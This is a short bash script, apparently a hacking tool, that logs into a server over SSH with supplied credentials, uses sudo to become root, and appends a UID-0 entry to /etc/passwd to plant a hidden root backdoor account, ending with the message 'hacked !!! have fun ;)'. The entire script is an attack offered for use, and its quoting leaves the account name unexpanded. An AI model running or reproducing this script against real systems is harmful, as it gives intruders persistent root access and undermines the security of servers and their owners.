#!/bin/bash


echo ''
printf "Please enter the username: " 
read username
echo ''
###echo -n "Please enter the password" 
###read -s password
stty -echo
printf "Password: "
read password
stty echo
printf "\n"

printf "Please enter Server IP: " 
read serverip
echo ''

printf "Please enter hackername: " 
read BlackSmith
echo ''

sshpass -p $password ssh -l $username -o StrictHostKeyChecking=no $serverip  << EOF
echo 'old passwd file'
echo ''
#cat /etc/passwd
echo ''

#sudo su
echo $password ;

echo -e "$password\n"  | sudo -S cat /etc/passwd && sudo su

echo '$BlackSmith:x:0:1000::/home/goodguy:/bin/bash' >> /etc/passwd
echo ''
echo ''
echo 'Successfully Exploited...!'
echo ' '
cat /etc/passwd

echo 'hacked !!! have fun ;)'
EOF
